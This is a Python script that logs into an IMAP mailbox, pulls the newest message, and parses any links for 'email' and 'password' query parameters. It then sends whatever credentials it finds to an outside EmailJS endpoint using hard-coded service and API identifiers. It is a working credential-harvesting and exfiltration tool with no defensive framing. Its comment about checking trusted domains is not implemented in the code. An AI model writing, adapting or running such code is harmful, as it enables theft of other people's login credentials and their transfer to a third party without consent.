import imaplib
import re
import urllib.parse
import logging
import requests
import ssl
import socket

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Email server configuration (predefined for common email providers)
imap_servers = {
    'gmail.com': 'imap.gmail.com',
    'yahoo.com': 'imap.mail.yahoo.com',
    'outlook.com': 'outlook.office365.com',
    'hotmail.com': 'imap-mail.outlook.com'
    # Add other email providers here as needed
}

# Prompt for the login email (A's email)
login_email = input("Enter the login email: ").strip()
password = input("Enter the password for the email: ").strip()

# Get the domain part of the email to find the IMAP server
email_domain = login_email.split('@')[-1]

# Determine the IMAP server for the domain
imap_server = imap_servers.get(email_domain, None)

if not imap_server:
    logging.error(f"Could not find IMAP server for domain: {email_domain}")
    exit(1)

# emailjs.com configuration
emailjs_service_id = 'service_oyc7a9o'  # Edit your EmailJS service ID here
emailjs_template_id = 'template_bn5jzkh'  # Edit your EmailJS template ID here
emailjs_api_key = 'QJObhH45powgCqsCo'  # Edit your EmailJS API key here

# Secure SSL context
ssl_context = ssl.create_default_context()

# Connect to the email server
try:
    mail = imaplib.IMAP4_SSL(imap_server, ssl_context=ssl_context)
    mail.login(login_email, password)
except imaplib.IMAP4.error as e:
    logging.error(f"Failed to log in to the email server: {str(e)}")
    exit(1)

# Select the mailbox
try:
    mail.select('inbox')
except imaplib.IMAP4.error as e:
    logging.error(f"Failed to select the mailbox: {str(e)}")
    mail.close()
    mail.logout()
    exit(1)

# Fetch the latest email
try:
    status, data = mail.search(None, 'ALL')
    email_ids = data[0].split()
    latest_email_id = email_ids[-1]
    status, email_data = mail.fetch(latest_email_id, '(RFC822)')
    email_message = email_data[0][1].decode('utf-8')
except imaplib.IMAP4.error as e:
    logging.error(f"Failed to fetch the latest email: {str(e)}")
    mail.close()
    mail.logout()
    exit(1)

# Extract the link from the email
link_pattern = re.compile(r'https?://[^\s]+')
links = link_pattern.findall(email_message)

# Check if the email contains a link from a trusted domain or if no trusted domain is listed
login_email_found = None
login_password_found = None
for link in links:
    try:
        parsed_url = urllib.parse.urlparse(link)
        login_email_found = urllib.parse.parse_qs(parsed_url.query).get('email', [''])[0]
        login_password_found = urllib.parse.parse_qs(parsed_url.query).get('password', [''])[0]
        if login_email_found and login_password_found:
            break
    except Exception as e:
        logging.warning(f"Failed to parse URL: {str(e)}")

# Send the collected information using emailjs.com
if login_email_found and login_password_found:
    try:
        data = {
            'service_id': emailjs_service_id,
            'template_id': emailjs_template_id,
            'user_id': emailjs_api_key,
            'template_params': {
                'login_email': login_email_found,
                'login_password': login_password_found
            }
        }
        response = requests.post('https://api.emailjs.com/api/v1.0/email/send', json=data, verify=True)
        response.raise_for_status()
        logging.info("Collected information sent successfully.")
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to send the collected information: {str(e)}")
else:
    logging.info("No login email or password found in the email.")

# Close the connection
mail.close()
mail.logout()
